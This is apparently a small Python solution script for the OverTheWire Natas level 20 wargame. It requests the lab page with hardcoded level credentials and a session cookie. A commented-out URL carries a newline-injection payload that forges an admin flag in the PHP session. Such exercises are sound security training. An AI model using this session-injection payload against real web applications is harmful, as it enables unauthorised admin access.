#! env python3.9

import requests

#site = "http://natas20.natas.labs.overthewire.org/index.php?debug&name=admin\";\nadmin|s:1:\"1"
site = "http://natas20.natas.labs.overthewire.org/index.php?debug"
user = "natas20"
pswd = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"

cookies = dict(PHPSESSID="a0m7ij77gnebsdoq62hmmi7qvk")

r = requests.get(site, auth=(user, pswd), cookies=cookies)
print(r.text)



